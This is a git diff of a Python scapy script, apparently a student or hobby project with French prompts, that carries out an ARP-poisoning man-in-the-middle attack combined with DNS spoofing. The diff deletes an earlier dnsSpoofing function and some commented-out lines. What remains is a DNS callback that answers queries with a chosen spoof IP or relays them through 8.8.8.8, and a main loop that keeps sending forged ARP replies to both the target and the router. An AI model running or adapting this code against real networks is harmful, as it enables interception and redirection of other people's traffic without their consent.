@@ -26,17 +26,6 @@ def makeARPRequest(ip):
     (answered, unanswered) = scapy.srp(arpRequestBroadcast, timeout=1, verbose=0)
     return answered, unanswered
 
-def dnsSpoofing(targetIP, spoofIP,sourceIP):
-    packet = scapy.IP(dst=targetIP) / scapy.UDP(dport=53) / scapy.DNS(rd=1, qd=scapy.DNSQR(qname='google.com'))
-    answer = scapy.sr1(packet)
-    answer[scapy.DNS].an = scapy.DNSRR(rrname=answer[scapy.DNSQR].qname, ttl=10, rdata=spoofIP)
-    answer[scapy.DNS].ancount = 1
-    # del answer[scapy.IP].len
-    # del answer[scapy.IP].chksum
-    # del answer[scapy.UDP].len
-    # del answer[scapy.UDP].chksum
-    return answer
-
 def forwardDnsSpoofing(spooferIP):
     def forwardDNS(orgPacket: IP):
         print(orgPacket[DNSQR].qname)
@@ -47,12 +36,9 @@ def forwardDnsSpoofing(spooferIP):
             print('DNS Spoofed')
         else:
             print('DNS Forwarding')
-            # oldL3Socket = scapy.conf.L3socket
-            # scapy.conf.L3socket = scapy.L3RawSocket
             newPacket = IP(dst='8.8.8.8') / UDP(sport=orgPacket[UDP].sport, dport=53) / DNS(rd=1, id=orgPacket[DNS].id, qd=DNSQR(qname=orgPacket[DNSQR].qname))
             newPacket.show()
             answer = scapy.sr1(newPacket)
-            # scapy.conf.L3socket = oldL3Socket
             respPacket = IP(dst=orgPacket[IP].src, src=orgPacket[IP].dst) / UDP(dport=orgPacket[UDP].sport, sport=orgPacket[UDP].dport) / DNS()
             respPacket[DNS] = answer[DNS]
             respPacket.show()
@@ -84,7 +70,6 @@ def main():
     routeur=input('Entrez le numéro du routeur : ')
     routeur=pcs[int(routeur)-1]
     print('Vous avez choisi : ' + routeur[0] + ' ' + routeur[1])
-    # scapy.AsyncSniffer(prn=forwardDnsSpoofing("192.168.1.5"), filter='udp port 53', iface=interface, store=0).start()
     while True:
         scapy.send(scapy.ARP(op=2, pdst=cible[1], hwdst=cible[0], psrc=routeur[1], hwsrc=myMac), verbose=0)
         scapy.send(scapy.ARP(op=2, pdst=routeur[1], hwdst=routeur[0], psrc=cible[1], hwsrc=myMac), verbose=0)
